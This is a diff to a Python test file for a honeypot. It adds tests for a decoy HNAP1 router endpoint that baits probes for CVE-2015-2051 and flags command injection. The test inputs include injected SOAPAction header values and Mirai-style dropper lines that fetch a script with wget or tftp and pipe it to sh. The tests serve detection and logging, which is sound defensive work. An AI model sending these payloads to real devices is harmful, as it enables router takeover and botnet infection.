@@ -355,6 +355,7 @@ def test_all_trap_families_default_on():
     assert tbenv.IVANTI_VPN_ENABLED
     assert tbenv.ASPERA_FASPEX_ENABLED
     assert tbenv.HIKVISION_ENABLED
+    assert tbenv.HNAP1_ENABLED
     assert tbenv.GEOSERVER_ENABLED
     assert tbenv.COLDFUSION_ENABLED
     assert tbenv.CONFLUENCE_ENABLED
@@ -1757,6 +1758,145 @@ async def test_dispatch_hikvision_disabled_returns_404(flux_client, monkeypatch)
     resp = await flux_client.get(
         "/SDK/webLanguage",
         headers={"X-Forwarded-For": "203.0.113.94"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- HNAP1 router trap (CVE-2015-2051 bait) ---
+
+
+def test_hnap1_enabled_by_default():
+    assert tbenv.HNAP1_ENABLED
+
+
+def test_hnap1_default_paths_match_observed_probes():
+    for path in (
+        "/HNAP1",
+        "/hnap1",
+        "/HNAP1/",
+        "/Hnap1/",
+    ):
+        assert tbenv.is_hnap1_path(path), f"expected match: {path}"
+
+
+def test_hnap1_path_non_match():
+    for path in (
+        "/",
+        "/hnap",
+        "/HNAP",
+        "/HNAP1/foo",  # action paths under /HNAP1/<x> are not in default set
+        "/.env",
+    ):
+        assert not tbenv.is_hnap1_path(path), f"unexpected match: {path}"
+
+
+def test_hnap1_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "HNAP1_ENABLED", False)
+    assert not tbenv.is_hnap1_path("/HNAP1")
+
+
+def test_hnap1_has_cmdi_indicators():
+    # CVE-2015-2051: shell-meta in the SOAPAction value.
+    assert tbenv._hnap1_has_cmdi(
+        '"http://purenetworks.com/HNAP1/`wget http://x/y;sh`"', "", "",
+    )
+    assert tbenv._hnap1_has_cmdi(
+        '"http://purenetworks.com/HNAP1/$(id)"', "", "",
+    )
+    assert tbenv._hnap1_has_cmdi(
+        '"http://purenetworks.com/HNAP1/Login;reboot"', "", "",
+    )
+    # Mirai-style dropper bodies.
+    assert tbenv._hnap1_has_cmdi("", "", "wget http://x/y -O - | sh")
+    assert tbenv._hnap1_has_cmdi("", "", "tftp -g -r evil.bin 192.168.1.5")
+    # Plain GET banner-grab is not flagged.
+    assert not tbenv._hnap1_has_cmdi("", "", "")
+    assert not tbenv._hnap1_has_cmdi(
+        '"http://purenetworks.com/HNAP1/GetDeviceSettings"', "", "",
+    )
+
+
+async def test_dispatch_hnap1_get_returns_devicesettings_envelope(flux_client):
+    resp = await flux_client.get(
+        "/HNAP1",
+        headers={"X-Forwarded-For": "203.0.113.131"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "<soap:Envelope" in text
+    assert "<DeviceSettings" in text
+    assert tbenv.HNAP1_VENDOR in text
+    assert tbenv.HNAP1_MODEL in text
+    assert tbenv.HNAP1_FIRMWARE_VERSION in text
+    # Mathopd is a fingerprint a lot of Mirai-style scanners gate on.
+    assert resp.headers.get("Server", "").startswith("Mathopd/")
+    assert resp.headers.get("Content-Type", "").startswith("text/xml")
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "hnap1-discovery"
+    assert entry["hnap1Path"] == "/HNAP1"
+    assert entry["hnap1Method"] == "GET"
+    assert entry["hnap1HasCmdInjection"] is False
+
+
+async def test_dispatch_hnap1_post_uses_action_name_in_response(flux_client):
+    body = (
+        b'<?xml version="1.0" encoding="UTF-8"?>\n'
+        b'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
+        b'<soap:Body><Login xmlns="http://purenetworks.com/HNAP1/">'
+        b'<Action>request</Action><Username>admin</Username></Login>'
+        b'</soap:Body></soap:Envelope>\n'
+    )
+    resp = await flux_client.post(
+        "/HNAP1",
+        data=body,
+        headers={
+            "X-Forwarded-For": "203.0.113.132",
+            "Content-Type": "text/xml",
+            "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
+        },
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "<LoginResponse" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "hnap1-soap-action"
+    assert entry["hnap1Method"] == "POST"
+    assert entry["hnap1HasCmdInjection"] is False
+    assert entry["hnap1SoapAction"].startswith('"http://purenetworks.com/HNAP1/Login')
+    assert "bodyPreview" in entry
+
+
+async def test_dispatch_hnap1_flags_cmd_injection_in_soapaction_header(flux_client):
+    # CVE-2015-2051: shell payload concatenated into the SOAPAction value.
+    resp = await flux_client.post(
+        "/HNAP1",
+        data=b"<soap:Envelope/>",
+        headers={
+            "X-Forwarded-For": "203.0.113.133",
+            "Content-Type": "text/xml",
+            "SOAPAction": (
+                '"http://purenetworks.com/HNAP1/'
+                '`wget http://1.2.3.4/x.sh -O- | sh`"'
+            ),
+        },
+    )
+    assert resp.status == 200
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "hnap1-soap-action"
+    assert entry["hnap1HasCmdInjection"] is True
+    assert "wget" in entry["hnap1SoapAction"].lower()
+
+
+async def test_dispatch_hnap1_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "HNAP1_ENABLED", False)
+    resp = await flux_client.get(
+        "/HNAP1",
+        headers={"X-Forwarded-For": "203.0.113.134"},
     )
     assert resp.status == 404
     entries = _log_entries(flux_client.log_path)
